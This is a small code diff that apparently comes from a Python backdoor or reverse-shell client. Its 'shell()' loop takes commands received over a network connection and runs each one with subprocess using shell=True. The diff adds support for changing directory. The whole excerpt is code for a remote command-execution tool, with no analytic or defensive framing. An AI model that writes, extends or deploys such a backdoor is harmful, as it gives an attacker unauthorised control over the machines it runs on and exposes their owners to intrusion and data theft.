@@ -45,6 +45,11 @@ def shell():
 		command = reliable_rcv() # receive bytes
 		if command  == "q":
 			break
+		elif command[:2] == "cd" and len(command) > 1:
+			try:
+				os.chdir(command[3:])
+			except:
+				continue
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
